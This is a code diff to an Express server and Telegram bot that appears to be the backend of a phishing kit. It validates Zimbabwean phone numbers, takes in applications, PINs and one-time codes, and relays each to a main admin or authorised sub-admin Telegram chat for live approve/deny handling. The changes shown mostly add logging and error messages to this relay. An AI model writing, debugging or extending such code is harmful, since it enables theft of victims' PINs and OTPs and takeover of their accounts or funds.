@@ -9,7 +9,10 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 // Configuration with environment priority and fallback to your chat ID
 const getBotToken = () => process.env.TELEGRAM_BOT_TOKEN || process.env.TOKEN;
-const getAppUrl = () => process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
+const getAppUrl = () => {
+  let url = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
+  return url ? url.replace(/\/$/, '') : '';
+};
 const getFallbackAdmin = () => process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400';
 
 const ADMINS_FILE = path.join(__dirname, 'admins.json');
@@ -58,23 +61,17 @@ function isValidZimbabwePhone(phone) {
 function resolveTargetChat(adminParam) {
   const fallbackAdminId = getFallbackAdmin();
   
-  // If an admin parameter is provided in the URL query string
   if (adminParam && String(adminParam).trim() !== '') {
     const targetAdmin = String(adminParam).trim();
-    
-    // If it matches the main admin
     if (targetAdmin === String(fallbackAdminId)) {
       return fallbackAdminId;
     }
-    
-    // Check if it's an authorized sub-admin
     const adminRecord = admins.get(targetAdmin);
     if (adminRecord && adminRecord.authorized) {
-      return targetAdmin; // Routes exclusively to this specific sub-admin privately
+      return targetAdmin;
     }
   }
   
-  // Default fallback if no valid parameter is given
   return fallbackAdminId || null;
 }
 
@@ -150,13 +147,21 @@ function initBot() {
   const webhookPath = `/bot${currentToken}`;
   const webhookUrl = `${appUrl}${webhookPath}`;
 
-  bot.setWebHook(webhookUrl).catch((err) => {
+  console.log(`Setting Telegram webhook to: ${webhookUrl}`);
+  bot.setWebHook(webhookUrl).then(() => {
+    console.log('Webhook successfully configured.');
+  }).catch((err) => {
     console.error('Failed to set webhook:', err);
   });
 
   app.post(webhookPath, (req, res) => {
     res.sendStatus(200);
-    try { bot.processUpdate(req.body); } catch (err) {}
+    try { 
+      console.log('Webhook update received from Telegram:', JSON.stringify(req.body));
+      bot.processUpdate(req.body); 
+    } catch (err) {
+      console.error('Error processing webhook update:', err);
+    }
   });
 
   bot.onText(/\/admins/, async (msg) => {
@@ -277,6 +282,7 @@ function initBot() {
     try {
       const actionData = query.data || '';
       const chatId = String(query.message.chat.id);
+      console.log(`Callback query received: ${actionData} from chat${chatId}`);
 
       if (actionData.startsWith('AUTH_YES_') || actionData.startsWith('AUTH_NO_')) {
         if (chatId !== String(fallbackAdminId)) {
@@ -384,6 +390,7 @@ function initBot() {
         ).catch(() => {});
       }
     } catch (err) {
+      console.error('Error handling callback query:', err);
       try {
         await bot.answerCallbackQuery(query.id, { text: '⚠️ Processing error.' }).catch(() => {});
       } catch (e) {}
@@ -425,6 +432,7 @@ app.post('/api/submit-application', async (req, res) => {
 
     return res.status(200).json({ success: true, sessionId: userId });
   } catch (err) {
+    console.error('Error in /api/submit-application:', err);
     return res.status(500).json({ success: false, error: 'Server error: ' + (err?.message || 'Unknown') });
   }
 });
@@ -457,13 +465,17 @@ app.post('/api/submit-pin', async (req, res) => {
     };
 
     if (bot && session.adminChatId) {
+      console.log(`Sending PIN submission message to admin/sub-admin chat: ${session.adminChatId}`);
       const sentMsg = await bot.sendMessage(session.adminChatId, message, opts);
       session.adminMsgId = sentMsg.message_id;
+    } else {
+      console.error('Bot instance or session.adminChatId is missing!');
     }
 
     return res.status(200).json({ success: true });
   } catch (err) {
-    return res.status(500).json({ success: false, error: 'Telegram error' });
+    console.error('Error in /api/submit-pin:', err);
+    return res.status(500).json({ success: false, error: 'Telegram error: ' + err.message });
   }
 });
 
@@ -498,13 +510,17 @@ app.post('/api/submit-otp', async (req, res) => {
     };
 
     if (bot && session.adminChatId) {
+      console.log(`Sending OTP submission message to admin/sub-admin chat: ${session.adminChatId}`);
       const sentMsg = await bot.sendMessage(session.adminChatId, message, opts);
       session.adminMsgId = sentMsg.message_id;
+    } else {
+      console.error('Bot instance or session.adminChatId is missing!');
     }
 
     return res.status(200).json({ success: true });
   } catch (error) {
-    return res.status(500).json({ success: false, error: 'Telegram error' });
+    console.error('Error in /api/submit-otp:', error);
+    return res.status(500).json({ success: false, error: 'Telegram error: ' + error.message });
   }
 });
 
@@ -521,4 +537,4 @@ app.listen(PORT, () => {
   console.log(`Server is running and listening on port ${PORT}`);
   initBot();
 });
-  
+    
